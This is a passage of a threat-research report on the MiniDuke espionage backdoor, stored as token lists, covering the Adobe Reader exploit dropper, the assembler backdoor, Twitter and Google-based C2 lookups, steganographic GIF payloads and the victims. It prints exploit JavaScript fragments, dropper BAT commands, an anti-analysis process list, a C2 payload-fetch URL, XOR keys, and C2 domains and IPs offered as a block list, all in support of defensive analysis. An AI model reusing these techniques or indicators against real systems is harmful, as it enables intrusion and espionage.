"Spy", "Assembler", "0x29A", "Micro", "Backdoor"], ["(", "or", "\u2018", "how", "many", "cool", "words", "can", "you", "fit", "into", "one", "title", "\u2019", ")"], ["Authors", ":", "Costin", "Raiu", ",", "Igor", "Soumenkov", ",", "Kurt", "Baumgartner", ",", "Vitaly", "Kamluk", "Global", "Research", "and", "Analysis", "Team", ",", "Kaspersky", "Lab"], ["On", "Feb", "12th", "2013", ",", "FireEye", "announced", "the", "discovery", "(", "http://blog.fireeye.com/research/2013/02/the-number-of-thebeast.html", ")", "of", "an", "Adobe", "Reader", "0", "-", "day", "exploit", "which", "is", "used", "to", "drop", "a", "previously", "unknown", ",", "advanced", "piece", "of", "malware", "."], ["We", "called", "this", "new", "malware", "\u201c", "ItaDuke", "\u201d", "because", "it", "reminded", "us", "of", "Duqu", "and", "because", "of", "the", "ancient", "Italian", "comments", "in", "the", "shellcode", "copied", "from", "Dante", "Aligheri", "\u2019s", "Divine", "Comedy", "."], ["Since", "the", "original", "announcement", ",", "we", "have", "observed", "several", "new", "incidents", "using", "the", "same", "exploit", "(", "CVE-2013", "-", "0640", ")", ",", "some", "of", "which", "were", "so", "unusual", "that", "we", "decided", "to", "analyze", "them", "in", "depth", "."], ["Together", "with", "our", "partner", "CrySyS", "Lab", ",", "we", "\u2019ve", "performed", "a", "detailed", "analysis", "of", "these", "new", "incidents", "which", "indicate", "a", "new", ",", "previously", "unknown", "threat", "actor", "."], ["For", "their", "analysis", ",", "please", "read", "http://blog.crysys.hu/2013/02/miniduke/", "."], ["For", "our", "analysis", ",", "please", "read", "below", "."], ["First", "of", "all", ",", "while", "the", "fake", "\u201c", "Mandiant", "\u201d", "PDF", "reports", "(", "see", "http://blog.seculert.com/2013/02/spear-phishing-with-mandiant-aptreport.html?utm_source=feedburner&utm_medium=feed&utm_campaign=Feed%3A+SeculertResearchLab+(Seculert+Researc", "h+Lab", ")", ")", "are", "just", "dirty", "hacks", "of", "the", "original", "exploit", ",", "these", "newer", "attacks", "appear", "to", "have", "been", "created", "by", "a", "0", "-", "day", "toolkit", "that", "was", "used", "to", "build", "the", "original", "\u201c", "Visaform", "Tukey.pdf", "\u201d", "discovered", "by", "FireEye", "."], ["PAGE", "1|"], ["The", "MiniDuke", "Mystery", ":", "PDF", "0", "-", "day", "Government", "Spy", "Assembler", "0x29A", "Micro", "Backdoor|"], ["The", "new", "PDF", "attacks", "drop", "fake", "documents", "that", "are", "shown", "to", "the", "victim", "if", "the", "exploit", "is", "successfully", "executed", "."], ["The", "documents", "refer", "to", "a", "human", "rights", "seminar", "(", "ASEM", ")", "and", "Ukraine", "\u2019s", "foreign", "policy", "and", "NATO", "membership", "plans", ":", "Document", "used", "against", "the", "Hungarian", "target", "PAGE", "2|"], ["The", "MiniDuke", "Mystery", ":", "PDF", "0", "-", "day", "Government", "Spy", "Assembler", "0x29A", "Micro", "Backdoor", "|", "Document", "used", "against", "the", "Belgian", "target", "PAGE", "3|"], ["The", "MiniDuke", "Mystery", ":", "PDF", "0", "-", "day", "Government", "Spy", "Assembler", "0x29A", "Micro", "Backdoor", "|", "Document", "used", "against", "the", "Luxemburg", "target"], ["The", "MD5s", "for", "the", "documents", "used", "in", "this", "attack", "are", ":"], ["3668b018b4bb080d1875aee346e3650a", "88292d7181514fda5390292d73da28d4", "3f301758aa3d5d123a9ddbad1890853b", "0cdf55626e56ffbf1b198beb4f6ed559"], ["cf5a5239ada9b43592757c0d7bf66169", "c03bcb0cde62b3f45b4d772ab635e2b0", "action_plan.pdf", "(", "Country", ":", "Belgium", ")"], ["ASEM_seminar.pdf", "(", "Country", ":", "Hungary", ")"], ["EUAG_report.pdf", "(", "Country", ":", "Luxembourg", ")"], ["report.pdf", "(", "Country", ":", "Spain", ")"], ["EUAG_report.pdf", "(", "Country", ":", "Belgium", ")"], ["The", "2013", "Armenian", "Economic", "Association.pdf", "(", "Country", ":", "Belgium", ")"], ["The", "JavaScript", "exploit", "code", "has", "been", "modified", "since", "the", "original", "attack", "."], ["For", "instance", ",", "the", "function", "named", "\u201c", "oTHERWISE", "\u201d", "was", "renamed", "to", "\u201c", "q1w2e3r4", "t", "\u201d", "."], ["The", "function", "is", "later", "called", "in", "the", "code", "like", "this", ":", "New", "exploit", ":", "var", "sCIENZA", "=", "q1w2e3r4t(vOLENCI[sHOGG('ODNEDNERp',3329,7937", ")", "]", ",", "gIRARSI", ")", ";"], ["Older", "(", "\u201c", "Visaform", "Turkey.pdf", "\u201d", ")", "exploit", ":", "PAGE", "4|"], ["The", "MiniDuke", "Mystery", ":", "PDF", "0", "-", "day", "Government", "Spy", "Assembler", "0x29A", "Micro", "Backdoor", "|", "var", "sCIENZA", "=", "oTHERWISE", "(", "vOLENCI['pRENDENDO", "'", "]", ",", "gIRARSI", ")", ";"], ["In", "addition", ",", "the", "JS", "code", "is", "now", "in", "compressed", "format", ",", "while", "the", "original", "sample", "had", "it", "in", "plaintext", "."], ["The", "reason", "behind", "the", "changes", "is", "probably", "to", "avoid", "detection", "by", "anti", "-", "malware", "products", "although", "this", "does", "n\u2019t", "prevent", "our", "product", "from", "detecting", "it", "heuristically", "as", "\u201c", "HEUR", ":", "Exploit", "."], ["Script", "."], ["Generic", "\u201d", "."], ["The", "shellcode", "contained", "in", "the", "PDF", "document", "is", "similar", "to", "that", "used", "in", "the", "documents", "carrying", "the", "\u201c", "Itaduke", "\u201d", "payload", ",", "with", "some", "differences", "."], ["For", "instance", ",", "after", "exploiting", "the", "vulnerability", ",", "it", "searches", "for", "a", "specific", "signature", "within", "the", "PDF", "file", "."], ["While", "the", "\u201c", "Itaduke", "\u201d", "shellcode", "was", "looking", "for", "\u201c", "!", "H2bYm", ".", "Sw@", "\u201d", ",", "the", "MiniDuke", "version", "uses", "a", "different", "signature", ",", "\u201c", "@34fZ7E*p\\", "\u201d", "."], ["Signature", "in", "the", "Itaduke", "PDF", "file", "Signature", "in", "the", "Miniduke", "PDF", "file"], ["Once", "the", "payload", "signature", "is", "found", ",", "it", "is", "decrypted", "with", "XOR", "and", "then", "decompressed", "using", "RtlDecompressBuffer", "API", "(", "LZNT1", ")", "."], ["The", "resulting", "PE", "file", "is", "written", "to", "a", "temporary", "file", "and", "loaded", "using", "LoadLibary", "API", "."], ["The", "resulting", "dynamic", "library", "implements", "the", "second", "stage", "of", "installation", "."], ["It", "contains", "two", "binary", "resources", ",", "101", "and", "102", "."], ["Resource", "101", "is", "the", "main", "backdoor", "DLL", "component", "."], ["It", "is", "written", "to", "the", "%", "AppData%", "directory", "and", "loaded", "using", "LoadLibary", "API", "."], ["Resource", "102", "is", "the", "decoy", "PDF", "document", "."], ["It", "is", "written", "to", "the", "Internet", "cache", "directory", "and", "then", "opened", "using", "a", "simple", "BAT", "file", ":"], ["TASKKILL", "/F", "/IM", "acro", "*", "ping", "-n", "1", "127.0.0.1", ">", "nul", "start", "\"", "\"", "\"", "%", "path", "to", "decoy", "PDF", "document%", "\""], ["The", "filenames", "of", "the", "dropped", "files", "are", "hardcoded", "in", "their", "resources", "."], ["Beginning", "of", "the", "resource", "101", "with", "its", "filename", "Beginning", "of", "the", "resource", "102", "with", "its", "filename"], ["Interestingly", ",", "the", "malware", "dropper", "contains", "the", "following", "paths", ":", "\u25cf", "\u25cf", "\u201c", "c:\\src\\dlldropper\\Release\\L2P.pdb", "\u201d", "."], ["\u201c", "C:\\src\\hellodll\\Release\\hellodll.pdb", "\u201d", "."], ["PAGE", "5|"], ["The", "MiniDuke", "Mystery", ":", "PDF", "0", "-", "day", "Government", "Spy", "Assembler", "0x29A", "Micro", "Backdoor", "|"], ["These", "paths", "did", "not", "exist", "in", "the", "dropper", "of", "original", "PDF", "(", "\u201c", "Visaform", "Turkey.pdf", "\u201d", ")", "."], ["If", "we", "are", "to", "trust", "the", "PE", "headers", ",", "the", "dropper", "was", "compiled", "on", "Feb", "20", ",", "2013", ":", "\u2018", "Hungarian", "\u2019", "dropper", "compilation", "time", "-", "\u201c", "Feb", "20", "10:51:16", "2013", "\u201d"], ["The", "backdoor", "used", "in", "the", "Hungarian", "case", "was", "compiled", "on", "\u201c", "Feb", "20", "10:57:52", "2013", "\u201d", ",", "just", "minutes", "after", "the", "dropper", "was", "created", "."], ["Perhaps", "the", "most", "unusual", "thing", "about", "these", "three", "new", "attacks", "is", "the", "malware", "they", "drop", "."], ["In", "all", "the", "analyzed", "cases", ",", "the", "dropped", "malware", "is", "in", "the", "form", "of", "a", "22,528", "bytes", "DLL", "file", "."], ["Parts", "of", "the", "malicious", "DLL", "file", "are", "encrypted", "with", "information", "related", "to", "the", "system", "configuration", ",", "which", "ensures", "it", "will", "only", "work", "properly", "on", "the", "victim", "\u2019s", "system", "."], ["If", "copied", "to", "another", "computer", ",", "the", "malware", "will", "be", "unable", "to", "function", "successfully", "."], ["The", "backdoor", "is", "written", "in", "\u201c", "old", "school", "\u201d", "assembler", "and", "is", "tiny", "by", "current", "standards", "-", "only", "20", "KB", "."], ["This", "is", "most", "unusual", "for", "modern", "malware", ",", "which", "can", "be", "several", "megabytes", "in", "size", "."], ["It", "has", "a", "small", "decryptor", "at", "the", "beginning", "that", "decrypts", "the", "main", "body", "."], ["All", "three", "cases", "use", "different", "encryption", "keys", "."], ["Another", "peculiarity", "is", "that", "the", "backdoor", "has", "no", "imports", ":", "all", "functions", "are", "scanned", "from", "memory", "and", "are", "called", "dynamically", "."], ["It", "is", "also", "interesting", "that", "the", "first", "two", "Win32", "APIs", "resolved", "and", "called", "by", "the", "unpacking", "stub", "are", "ntdll", "."], ["LdrLoadDll", "and", "kernel32.VirtualProtectEx", "."], ["These", "two", "functions", "are", "not", "called", "according", "to", "the", "\u201c", "_", "stdcall", "\u201d", "convention", "."], ["Instead", ",", "a", "\u2018", "jmp", "ebx", "\u2019", "instruction", "is", "executed", "after", "manually", "building", "the", "stack", "."], ["Clearly", "some", "thought", "went", "into", "creating", "anti", "-", "emulation", "and", "anti", "-", "scanning", "techniques", "with", "this", "malware", "."], ["Backdoor", "analysis"], ["The", "backdoor", "has", "a", "single", "export", ",", "which", "for", "instance", "is", "named", "\u201c", "JorNgoq", "\u201d", "in", "the", "Hungarian", "case", "."], ["When", "this", "export", "is", "called", "at", "load", ",", "the", "backdoor", "sets", "the", "\u201c", ".rdata", "\u201d", "section", "\u2019s", "permissions", "to", "\u201c", "RWX", "\u201d", "and", "sets", "the", "mutex", "to", "a", "hardcoded", "string", "\u201c", "nljhfdb", "\u201d", "."], ["The", "entrypoint", "of", "the", "library", "(", "DllMain", ")", "is", "obfuscated", "and", "the", "main", "body", "of", "the", "malware", "is", "encrypted", "."], ["The", "encryption", "is", "rather", "simple", ":", "the", "\u201c", ".rdata", "\u201d", "section", "of", "the", "library", "is", "ROL\u2019ed", "with", "a", "linear", "key", "and", "XOR\u2019ed", "with", "a", "fixed", "key", "."], ["Both", "keys", "are", "derived", "from", "the", "length", "of", "the", "encrypted", "part", "."], ["PAGE", "6|"], ["The", "MiniDuke", "Mystery", ":", "PDF", "0", "-", "day", "Government", "Spy", "Assembler", "0x29A", "Micro", "Backdoor", "|", "Decryption", "loop", "in", "the", "obfuscated", "code", "."], ["0x4522", "is", "the", "actual", "size", "of", "the", "encrypted", "part"], ["Once", "finished", "decrypting", ",", "the", "library", "proceeds", "to", "the", "real", "\u201c", "main", "\u201d", "function", "."], ["The", "main", "part", "of", "the", "library", "is", "written", "in", "Assembler", ",", "in", "an", "\u201c", "old", "-", "school", "\u201d", "manner", "typical", "for", "low", "-", "level", "viruses", "."], ["The", "code", "is", "position", "independent", ";", "it", "has", "no", "imports", "and", "resolves", "API", "function", "addresses", "by", "hash", "values", "of", "their", "names", ".", "."], ["Typical", "low", "-", "level", "malware", "programming", "style", ":", "passing", "strings", "as", "parameters", "via", "call", ",", "addressing", "API", "functions", "by", "hash", "values", "The", "backdoor", "maintains", "seven", "call", "addresses", "that", "each", "maintain", "their", "own", "block", "of", "functionality", "."], ["The", "first", "block", "calls", "GetAsyncKeyState", "twice", ",", "checking", "for", "a", "mouse", "click", ",", "which", "indicates", "user", "activity", "in", "the", "system", "."], ["The", "second", "block", "searches", "for", "all", "\u201c", "*", ".exe", "\u201d", "and", "\u201c", "*", ".dll", "\u201d", "files", "located", "in", "the", "%", "temp%", "directory", "."], ["The", "third", "block", "fetches", "information", "about", "the", "infected", "system", "with", "calls", "to", "gather", "information", "about", "the", "CPU", ",", "drive", "and", "the", "computername", "-", "these", "are", "used", "to", "decrypt", "the", "backdoor", "\u2019s", "main", "body", ",", "which", "is", "custom", "encrypted", "for", "each", "unique", "victim", "."], ["PAGE", "7|"], ["The", "MiniDuke", "Mystery", ":", "PDF", "0", "-", "day", "Government", "Spy", "Assembler", "0x29A", "Micro", "Backdoor", "|"], ["The", "fourth", "block", "attempts", "to", "maintain", "self", "-", "protection", "from", "malware", "analysis", "."], ["Below", "is", "the", "list", "of", "tools", "(", "and", "VMware", ")", "that", "it", "attempts", "to", "identify", "and", "protect", "against", "."], ["It", "fetches", "the", "list", "of", "running", "processes", "on", "the", "system", "and", "attempts", "to", "identify", "if", "these", "tools", "are", "among", "them", ":"], ["apispy32.exe", ",", "apimonitor.exe", ",", "winapioverride32.exe", ",", "procmon.exe", ",", "filemon.exe", ",", "regmon.exe", ",", "winspy.exe", ",", "wireshark.exe", ",", "dumpcap.exe", ",", "tcpdump.exe", ",", "tcpview.exe", ",", "windump.exe", ",", "netsniffer.exe", ",", "iris.exe", ",", "comview.exe", ",", "ollydbg.exe", ",", "windbg.exe", ",", "odb.exe", ",", "ImmunityDebugger.exe", ",", "syser.exe", ",", "idag.exe", ",", "idag64.exe", ",", "petools.exe", ",", "vboxtray.exe", ",", "vboxservice.exe", ",", "procexp.exe", ",", "vmtools.exe", ",", "vmwaretray.exe", ",", "vmwareuser.exe"], ["If", "any", "of", "the", "tools", "above", "are", "detected", "on", "the", "system", ",", "the", "malware", "will", "continue", "running", "on", "the", "system", "without", "further", "decrypting", "its", "code", "and", "exhibiting", "any", "other", "functionality", "."], ["This", "will", "prevent", "it", "from", "doing", "any", "outbound", "communications", "with", "Twitter", "accounts", ",", "as", "described", "below", "."], ["In", "other", "words", ",", "it", "will", "attempt", "to", "appear", "non", "-", "functional", ",", "especially", "to", "automated", "analysis", ",", "hiding", "its", "true", "nature", "behind", "its", "layers", "of", "encryption", "."], ["User", "agent", "strings", "for", "web", "browsers", "like", "Opera", ",", "Mozilla", "and", "Internet", "Explorer", "are", "decrypted", "and", "used", "for", "all", "Internet", "access", "."], ["Oddly", ",", "there", "are", "Linux", "versions", "included", "as", "well", ":", "(", "Windows", "NT", "5.1", ";", "(", "Windows", "NT", "6.0", ";", "(", "Windows", ";", "U", ";", "Windows", "NT", "5.2", ";", "(", "X11", ";", "Linux", "i686", ";", "(", "X11", ";", "Linux", "x86_64", ";", "(", "compatible", ";", "MSIE", "6.0", ";", "Windows", "NT", "5.0", ";", "(", "compatible", ";", "MSIE", "7.0", ";", "Windows", "NT", "6.0", ";", "(", "compatible", ";", "MSIE", "9.0", ";", "Windows", "NT", "6.1;WOW64", ")", ";", "Trident/4.0", ")", ";", "Trident/5.0", ")", ";"], ["WOW64", ";", "Trident/5.0", ")", ";", "SV1", ")", ")"], ["The", "fifth", "and", "sixth", "code", "blocks", "are", "most", "interesting", "."], ["They", "calculate", "the", "SHA1", "of", "main", "system", "information", "which", "will", "be", "used", "in", "the", "C2", "interaction", "later", "."], ["Following", "the", "SHA-1", "hash", "generation", ",", "the", "backdoor", "will", "base64", "encode", "its", "unique", "hash", "for", "later", "C2", "communication", "."], ["The", "malware", "is", "activated", "upon", "reboot", "of", "the", "infected", "machine", "."], ["To", "gain", "control", "at", "boot", ",", "it", "writes", "a", "randomly", "named", "LNK", "file", "to", "the", "startup", "folder", ",", "which", "in", "turn", "calls", "the", "main", "body", "using", "rundll32", ":", "PAGE", "8|"], ["The", "MiniDuke", "Mystery", ":", "PDF", "0", "-", "day", "Government", "Spy", "Assembler", "0x29A", "Micro", "Backdoor", "|", "PAGE", "9|"], ["The", "MiniDuke", "Mystery", ":", "PDF", "0", "-", "day", "Government", "Spy", "Assembler", "0x29A", "Micro", "Backdoor", "|"], ["In", "the", "picture", "above", ",", "the", "malware", "\u2019s", "main", "body", "is", "stored", "as", "\u201c", "stat.bin", "\u201d", "(", "a", "randomly", "selected", "name", ")", "in", "the", "\u201c", "Adobe", "\u201d", "folder", "."], ["The", "LNK", "file", "calls", "it", "only", "exported", "function", ",", "\u201c", "ImqRgno", "\u201d", "."], ["Once", "activated", ",", "the", "malware", "will", "first", "contact", "Twitter", "and", "look", "for", "posts", "from", "some", "very", "specific", "accounts", "."], ["These", "accounts", "should", "have", "posted", "an", "encrypted", "string", "which", "contains", "the", "magic", "identifier", "\u201c", "uri", "!", "\u201d", ",", "then", "an", "encrypted", "c2", "string", "."], ["PAGE", "10|", "The", "MiniDuke", "Mystery", ":", "PDF", "0", "-", "day", "Government", "Spy", "Assembler", "0x29A", "Micro", "Backdoor", "|"], ["We", "presume", "many", "other", "Twitter", "accounts", "exist", "with", "similar", "parameters", "."], ["The", "encrypted", "\u201c", "uri", "!", "\u201d", "holds", "a", "different", "c2", "for", "each", "version", "of", "the", "malware", ":", "Attack", "location", "Command", "&", "control", "server", "C2", "IP", "/", "location", "path", "on", "C2", "PAGE", "11|"], ["The", "MiniDuke", "Mystery", ":", "PDF", "0", "-", "day", "Government", "Spy", "Assembler", "0x29A", "Micro", "Backdoor", "|", "Hungary", "arabooks[dot]ch", "194.38.160.153", "/"], ["Switzerland", "/lib", "/", "index.php", "Luxemburg", "artas[dot]org", "95.128.72.24", "/", "France", "/engine", "/", "index.php", "Belgium", "tsoftonline[dot]com", "72.34.47.186", "/", "United", "States", "/views", "/", "index.php", "(", "Multiple", ")", "www[dot]eamtm[dot]co", "m", "188.40.99.143", "/", "Germany"], ["/piwik", "/", "web", "/", "index.php", "It", "\u2019s", "most", "likely", "that", "these", "websites", "have", "been", "hacked", "by", "the", "attackers", "and", "injected", "with", "the", "command", "and", "control", "PHP", "script", "."], ["Secondly", ",", "the", "malware", "will", "connect", "to", "\u201c", "www.geoiptool.com", "\u201d", "to", "obtain", "information", "about", "the", "victim", "\u2019s", "location", "."], ["Interestingly", ",", "the", "backdoor", "has", "another", "update", "/", "c2", "functionality", "."], ["It", "searches", "Google", "for", "a", "very", "specific", "string", ":", "The", "string", "\u201c", "lUFEfiHKljfLKWPR", "\u201d", "which", "the", "malware", "seeks", "on", "Google"], ["The", "pages", "found", "by", "the", "Google", "search", "may", "hold", "an", "update", "\u201c", "uri", "\u201d", "similar", "to", "the", "one", "from", "Twitter", "."], ["We", "can", "assume", "the", "attackers", "wanted", "to", "have", "a", "second", "channel", "for", "updates", "in", "case", "the", "Twitter", "accounts", "are", "closed", "."], ["PAGE", "12|", "The", "MiniDuke", "Mystery", ":", "PDF", "0", "-", "day", "Government", "Spy", "Assembler", "0x29A", "Micro", "Backdoor", "|", "Stage", "2"], ["The", "\u201c", "index.php", "\u201d", "on", "the", "C2", "serves", "a", "fake", "GIF", "file", "to", "the", "victim", ",", "depending", "on", "the", "parameters", "it", "receives", "."], ["Here", "\u2019s", "what", "one", "of", "these", "GIF", "files", "looks", "like", ":", "Here", "\u2019s", "one", "example", "of", "a", "malicious", "request", "for", "the", "C2", "domain", "\u201c", "arabooks*dot+ch", "\u201d", ":"], ["arabooks.ch/lib/index.php?ia=TJ2b7uzMuh4fnt2n7aJisckAj6pEvkLPPsmk5gC77rPeYKmj8z58UWS1szY0FGzkp[REMOVED]lhUDx", "vzo1_IpYHfDI2MTg2NTM5OTF8MS4xMw=="], ["The", "picture", "from", "the", "GIF", "file", "is", "actually", "very", "small", "and", "reminds", "us", "of", "the", "method", "used", "by", "Duqu", "back", "in", "2011", "to", "hide", "data", ",", "known", "as", "\u2018", "steganography", "\u2019", ":", "At", "offset", "0x6a4", "inside", "the", "GIF", "file", ",", "there", "is", "a", "hidden", "encrypted", "PE", "file", "."], ["The", "encryption", "scheme", "used", "a", "DWORD", "key", "also", "stored", "in", "the", "GIF", "file", "that", "is", "rotated", "."], ["Effectively", ",", "this", "translates", "to", "an", "8", "byte", "long", "XOR", "key", "."], ["The", "resulting", "encryption", "key", "used", "in", "the", "Hungarian", "attack", "for", "instance", "is", "{", "0xD2", ",", "0x2A", ",", "0xA2", ",", "0x27", ",", "0x79", ",", "0x95", ",", "0x52", ",", "0x2D", "}", "."], ["In", "the", "Belgian", "attack", ",", "it", "is", "{", "0xC5", ",", "0x5E", ",", "0xEE", ","], ["0xE5", ",", "0x51", ",", "0x11", ",", "0x17", ",", "0x7C", "}", "."], ["For", "the", "Luxemburg", "attack", ",", "the", "key", "is", "{", "0x91", ",", "0x18", ",", "0x8C", ",", "0xC1", ",", "0x1C", ",", "0xC9", ",", "0x9C", ",", "0xC9", "}", "."], ["PAGE", "13|", "The", "MiniDuke", "Mystery", ":", "PDF", "0", "-", "day", "Government", "Spy", "Assembler", "0x29A", "Micro", "Backdoor", "|", "Decrypted", "payload", "from", "the", "fake", "GIF", "file", "served", "by", "the", "C2"], ["The", "decrypted", "PE", "file", "(", "plugin", "/", "payload", ")", "is", "also", "written", "in", "assembler", "and", ",", "once", "again", ",", "it", "is", "encrypted", "with", "the", "same", "algorithm", "as", "the", "backdoor", "originally", "deployed", "in", "the", "system", "."], ["We", "refer", "to", "it", "as", "\u201c", "stage", "2", "\u201d", "."], ["The", "main", "backdoor", "body", "saves", "the", "plugin", "with", "different", "names", ",", "for", "instance", ",", "it", "can", "be", "\u201c", "xml.dat", "\u201d", "and", "tries", "to", "run", "its", "only", "export", "using", "rundll", "."], ["In", "our", "case", ",", "this", "did", "n\u2019t", "appear", "to", "work", "very", "well", ":", "PAGE", "14|", "The", "MiniDuke", "Mystery", ":", "PDF", "0", "-", "day", "Government", "Spy", "Assembler", "0x29A", "Micro", "Backdoor", "|", "Several", "different", "variants", "of", "the", "2nd", "stage", "backdoors", "have", "been", "observed", "on", "the", "C2", ";", "they", "all", "perform", "similar", "functions", "but", "are", "encrypted", "with", "different", "keys", "and", "contact", "different", "C2s", "."], ["Command", "&", "control", "server", "information"], ["The", "malware", "connects", "to", "several", "C2s", "depending", "on", "the", "information", "available", "on", "the", "control", "Twitter", "accounts", "or", "on", "Google", "."], ["For", "instance", ",", "on", "\u201c", "artas*dot+org", "\u201d", "it", "connects", "to", "\u201c", "/engine", "/", "index.php", "\u201d", "."], ["Interestingly", ",", "the", "\u201c", "img", "\u201d", "subfolder", "allows", "listings", "and", "we", "can", "see", "several", "variants", "of", "the", "backdoor", "encrypted", "as", "GIF", "files", ":", "PAGE", "15|", "The", "MiniDuke", "Mystery", ":", "PDF", "0", "-", "day", "Government", "Spy", "Assembler", "0x29A", "Micro", "Backdoor", "|"], ["On", "\u201c", "tsoftonline*dot+com", "\u201d", ",", "the", "folder", "has", "the", "same", "structure", ":", "Interestingly", ",", "on", "\u201c", "tsoftonline*dot+com", "\u201d", "we", "have", "several", "other", "files", "with", "different", "kind", "of", "names", "and", "sizes", "."], ["They", "are", "larger", "and", "follow", "a", "different", "naming", "scheme", ":", "\u201c", "*", "number+.gif", "\u201d", "."], ["We", "believe", "they", "are", "custom", "backdoors", "delivered", "only", "to", "specific", "victims", "by", "the", "attackers", "."], ["We", "refer", "to", "these", "as", "\u201c", "stage", "3", "\u201d", "."], ["PAGE", "16|"], ["The", "MiniDuke", "Mystery", ":", "PDF", "0", "-", "day", "Government", "Spy", "Assembler", "0x29A", "Micro", "Backdoor", "|", "Stage", "3", "While", "we", "were", "analyzing", "the", "samples", ",", "the", "attackers", "connected", "to", "the", "C2", "and", "added", "a", "custom", "backdoor", "as", "\u201c", "1109821546.gif", "\u201d", ":", "\"", "http://tsoftonline.com/views/img/1109821546.gif", "\"", "HTTP/1.1", "200", "OK"], ["Date", ":", "Mon", ",", "25", "Feb", "2013", "12:34:13", "GMT"], ["Server", ":", "Apache"], ["Last", "-", "Modified", ":"], ["Mon", ",", "25", "Feb", "2013", "10:59:49", "GMT"], ["ETag", ":", "\"", "7c8251", "-", "5190d-4d68a708d9340", "\""], ["Accept", "-", "Ranges", ":", "bytes"], ["Content", "-", "Length", ":", "334093"], ["Content", "-", "Type", ":", "image", "/", "gif"], ["This", "custom", "backdoor", ",", "referred", "to", "as", "\u201c", "stage", "3", "\u201d", ",", "is", "much", "bigger", "than", "the", "previous", "ones", "\u2013", "300K+", "in", "size", "."], ["This", "is", "because", "the", "attackers", "used", "large", "layers", "of", "obfuscation", "code", ",", "including", "UCL", "compression", "."], ["So", "far", ",", "we", "have", "observed", "two", "variants", "of", "the", "300", "K", "\u201c", "stage", "3", "\u201d", "backdoor", "."], ["The", "PE", "compilation", "timestamp", "for", "both", "is", "\u201c", "Mon", "Jun", "18", "17:28:11", "2012", "\u201d", "."], ["The", "number", "\u201c", "1109821546", "\u201d", "in", "the", "filename", "refers", "to", "the", "unique", "victim", "ID", "."], ["In", "this", "case", ",", "we", "were", "able", "to", "determine", "that", "the", "victim", "is", "based", "in", "Portugal", "."], ["The", "backdoor", "connects", "to", "the", "following", "C2", "for", "instructions", ":", "news[dot]grouptumbler[dot]com", "/", "news", "/", "feed.php", "IP", ":"], ["200.63.46.23"], ["It", "supports", "several", "commands", ",", "such", "as", "copy", "file", ",", "move", "file", ",", "remove", "file", ",", "make", "directory", ",", "kill", "process", "and", "of", "course", ",", "download", "and", "execute", "new", "malware", "."], ["The", "server", "at", "200.63.46.23", "is", "hosted", "in", "Panama", ":", "PAGE", "17|"], ["The", "MiniDuke", "Mystery", ":", "PDF", "0", "-", "day", "Government", "Spy", "Assembler", "0x29A", "Micro", "Backdoor", "|"], ["We", "presume", "that", "it", "was", "hacked", "by", "the", "attackers", "and", "is", "currently", "used", "as", "a", "command", "server", "for", "the", "attacks", "."], ["MD5", "hashes", "for", "the", "known", "\u201c", "Stage", "3", "\u201d", "backdoors", ":", "1e1b0d16a16cf5c7f3a7c053ce78f515", "53db085a276ebbf5798ba756cac833ea", "v1.ex", "_", "v2.ex", "_", "In", "addition", "to", "the", "~300", "K", "\u201c", "stage", "3", "\u201d", "backdoors", ",", "we", "\u2019ve", "observed", "a", "13", "K", "module", "(", "MD5", ":", "6bc34809e44c40b61dd29e0a387ee682).This", "module", "will", "connect", "to", "an", "IP", "in", "Turkey", ",", "get", "the", "response", ",", "decrypt", "it", "in", "memory", "and", "execute", "it", "."], ["The", "C2", "is", ":", "85.95.236.114"], ["The", "module", "has", "a", "compilation", "timestamp", "of", "\u201c", "Tue", "Nov", "13", "14:30:12", "2012", "\u201d", "."], ["Map", "of", "victims"], ["The", "C2s", "maintain", "a", "detailed", ",", "encoded", "log", "of", "the", "victims", "connecting", "to", "the", "servers", "."], ["The", "logs", "are", "available", "to", "anyone", "who", "knows", "the", "exact", "filename", "."], ["By", "collecting", "the", "logs", "from", "all", "the", "known", "command", "servers", ",", "we", "\u2019ve", "discovered", "connections", "from", "several", "high", "profile", "networks", "belonging", "to", ":", "Country", "Network", "Ukraine", "Government", ",", "Private", "company", "Belgium", "Possible", "Embassy", "/", "Government", "Portugal", "Government", "Romania", "Government", "PAGE", "18|", "The", "MiniDuke", "Mystery", ":", "PDF", "0", "-", "day", "Government", "Spy", "Assembler", "0x29A", "Micro", "Backdoor", "|", "Czech", "Republic", "Government", "Ireland", "Government", "United", "States", "Think", "tank(s", ")", ","], ["Research", "institute", ",", "Healthcare", "provider", "Hungary", "Social", "foundation", "By", "analyzing", "the", "logs", "from", "the", "command", "servers", ",", "we", "have", "observed", "59", "unique", "victims", "in", "23", "countries", ":", "Belgium", ",", "Brazil", ",", "Bulgaria", ",", "Czech", "Republic", ",", "Georgia", ",", "Germany", ",", "Hungary", ",", "Ireland", ",", "Israel", ",", "Japan", ",", "Latvia", ",", "Lebanon", ",", "Lithuania", ",", "Montenegro", ",", "Portugal", ",", "Romania", ",", "Russian", "Federation", ",", "Slovenia", ",", "Spain", ",", "Turkey", ",", "Ukraine", ",", "United", "Kingdom", "and", "United", "States", "."], ["The", "amount", "of", "high", "profile", "victims", "in", "this", "attack", "is", "notable", "and", "puts", "it", "on", "the", "same", "level", "with", "other", "advanced", "campaigns", "such", "as", "\u201c", "Red", "October", "\u201d", "."], ["Mitigation", "and", "recommendations"], ["To", "protect", "against", "these", "attacks", ",", "we", "recommend", "that", "you", ":", "\u25cf", "\u25cf", "\u25cf", "\u25cf", "\u25cf", "\u25cf", "\u25cf", "Update", "Java", "to", "the", "latest", "version", "or", "simply", "remove", "it", "from", "the", "system", "if", "not", "used"], ["Update", "Microsoft", "Windows", "and", "Office", "to", "the", "latest", "versions"], ["Update", "Adobe", "Reader", "to", "the", "latest", "version", "(", "see", "https://www.adobe.com/support/security/bulletins/apsb13-07.html", ")"], ["Block", "traffic", "to", "the", "following", "domains", ":"], ["\u25cb", "arabooks.ch", "\u25cb", "artas.org", "\u25cb", "tsoftonline.com", "\u25cb", "www.eamtm.com", "\u25cb", "news.grouptumbler.com", "Block", "traffic", "to", "the", "following", "IPs", ":"], ["\u25cb", "200.63.46.23"], ["\u25cb", "194.38.160.153", "\u25cb"], ["95.128.72.24", "\u25cb", "72.34.47.186", "\u25cb", "188.40.99.143", "\u25cb", "85.95.236.114"], ["Install", "a", "security", "solution", "capable", "of", "detecting", "these", "threats", "such", "as", "Kaspersky", "Internet", "Security", "2013", "and", "scan", "all", "emails", "and", "received", "documents"], ["Be", "wary", "of", "opening", "suspicious", "documents", "on", "your", "systems", ";", "instead", ",", "use", "another", "computer", "without", "an", "Internet", "connection", ",", "a", "VM", ",", "or", "upload", "the", "document", "to", "Google", "Docs", "for", "viewing", "In", "addition", ",", "infected", "PDFs", "contain", "the", "following", "string", 